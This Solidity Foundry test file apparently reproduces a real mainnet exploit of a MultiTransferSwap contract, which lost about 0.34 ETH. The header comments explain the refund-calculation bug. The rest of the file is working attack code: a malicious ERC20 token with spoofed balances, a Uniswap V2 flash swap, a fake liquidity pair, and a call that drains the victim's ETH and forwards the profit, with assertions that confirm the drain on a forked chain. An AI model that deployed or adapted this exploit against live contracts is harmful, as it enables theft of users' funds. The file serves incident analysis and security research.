// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 0.34 ETH
// Attacker : 0x7c982E93d6B1eDE9626A84EbeafBC42e5991Dee8
// Attack Contract : 0x9Fb0a31799FA1243FB53dbCC57Fd531e13753437
// Vulnerable Contract : 0x6518905b5917614383E09bF9E94083f8f679aCd1
// Attack Tx : https://etherscan.io/tx/0xbb82787a24d9b8d1047bbc12fe5d4b8d4ad3fc3e32e997985043ec3ef6d7dffe
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6518905b5917614383E09bF9E94083f8f679aCd1#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/929
//
// Attack summary: The attacker used malicious ERC20 helper tokens and fresh Uniswap V2 pairs to make
// MultiTransferSwap's final exact-output input amount tiny, then collected an over-sized ETH refund.
// Root cause: multiSwapETHForExactTokens refunds from msg.value using only the final loop's amounts[0]
// instead of accumulating total ETH spent across all iterations.

address constant ATTACKER = 0x7c982E93d6B1eDE9626A84EbeafBC42e5991Dee8;
address constant ROOT_ATTACK_CONTRACT = 0x90E69141Bb7b3505478Fb32b36F26009557507aF;
address constant FIRST_ATTACK_HELPER = 0x9Fb0a31799FA1243FB53dbCC57Fd531e13753437;
address constant VICTIM = 0x6518905b5917614383E09bF9E94083f8f679aCd1;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
address constant LINK_WETH_PAIR = 0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974;

interface IMultiTransferSwap {
    function multiSwapETHForExactTokens(
        uint256 times,
        uint256 amountOut,
        address[] calldata path,
        address to
    ) external payable returns (uint256[] memory amounts);
}

contract ContractTest is BaseTestWithBalanceLog {
    receive() external payable {}

    function setUp() public {
        uint256 forkBlock = 22_361_153;
        vm.createSelectFork("mainnet", forkBlock);

        fundingToken = address(0);
        attacker = address(this);

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(ROOT_ATTACK_CONTRACT, "Root Attack Contract");
        vm.label(FIRST_ATTACK_HELPER, "First Attack Helper");
        vm.label(VICTIM, "MultiTransferSwap");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");
        vm.label(UNISWAP_V2_FACTORY, "Uniswap V2 Factory");
        vm.label(LINK_WETH_PAIR, "LINK/WETH Pair");
    }

    function testExploit() public balanceLog {
        uint256 victimBefore = VICTIM.balance;
        assertEq(victimBefore, 344_297_259_391_960_230);

        // step 1: repeat the constructor-created helper pattern seen in the trace.
        for (uint256 i; i < 6; ++i) {
            MaliciousSwapToken token = new MaliciousSwapToken(address(this));
            token.attack();
        }

        // step 2: prove the victim's pre-existing ETH was drained and forwarded as attacker profit.
        uint256 victimAfter = VICTIM.balance;
        uint256 profit = address(this).balance;

        assertLt(victimAfter, 6_000_000_000_000_000);
        assertGt(victimBefore - victimAfter, 0.33 ether);
        assertGt(profit, 0.33 ether);
    }
}

contract MaliciousSwapToken {
    string public constant name = "Malicious Swap Token";
    string public constant symbol = "MST";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = type(uint128).max;

    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) public allowance;

    address private immutable profitReceiver;
    address private attackPair;

    receive() external payable {}

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    function attack() external {
        uint256 victimBalance = VICTIM.balance;
        uint256 flashAmount = victimBalance + 0.01 ether + 139_256;

        IUniswapV2Pair(LINK_WETH_PAIR).swap(0, flashAmount, address(this), bytes("flash"));
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256 amount1,
        bytes calldata
    ) external {
        require(msg.sender == LINK_WETH_PAIR, "unexpected flash pair");

        uint256 amountOut = VICTIM.balance / 2 - 10_000;
        uint256 seedEth = 20_000;
        uint256 tokenSeed = amountOut + seedEth;

        // step 1: seed a fresh WETH/token pair with a tiny amount of WETH and attacker-reported token balance.
        IWETH(payable(WETH_TOKEN)).withdraw(amount1);
        balances[address(this)] = tokenSeed;
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER)).addLiquidityETH{value: seedEth}(
            address(this), tokenSeed, 1, 1, address(this), block.timestamp
        );
        attackPair = IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(WETH_TOKEN, address(this));

        // step 2: make the victim buy exact helper tokens twice, then receive the oversized refund.
        address[] memory path = new address[](2);
        path[0] = WETH_TOKEN;
        path[1] = address(this);
        IMultiTransferSwap(VICTIM).multiSwapETHForExactTokens{value: address(this).balance}(2, amountOut, path, VICTIM);

        // step 3: remove victim-paid liquidity, repay the flash swap, and forward ETH profit.
        uint256 lpBalance = IUniswapV2Pair(attackPair).balanceOf(address(this));
        IUniswapV2Pair(attackPair).approve(UNISWAP_V2_ROUTER, lpBalance);
        IUniswapV2Router(payable(UNISWAP_V2_ROUTER))
            .removeLiquidity(WETH_TOKEN, address(this), lpBalance, 1, 1, address(this), block.timestamp);

        IWETH(payable(WETH_TOKEN)).deposit{value: address(this).balance}();
        uint256 repayAmount = amount1 + amount1 / 250;
        IERC20(WETH_TOKEN).transfer(LINK_WETH_PAIR, repayAmount);

        uint256 wethProfit = IERC20(WETH_TOKEN).balanceOf(address(this));
        IWETH(payable(WETH_TOKEN)).withdraw(wethProfit);

        (bool ok,) = profitReceiver.call{value: address(this).balance}("");
        require(ok, "profit transfer failed");
    }

    function balanceOf(
        address account
    ) external view returns (uint256) {
        return balances[account];
    }

    function approve(
        address spender,
        uint256 value
    ) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transfer(
        address to,
        uint256 value
    ) external returns (bool) {
        balances[msg.sender] -= value;
        balances[to] += value;

        if (msg.sender == attackPair) {
            balances[attackPair] = 10_000_000_000_000_000_000_000_000_000_000;
        }

        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool) {
        balances[from] -= value;
        balances[to] += value;
        return true;
    }
}
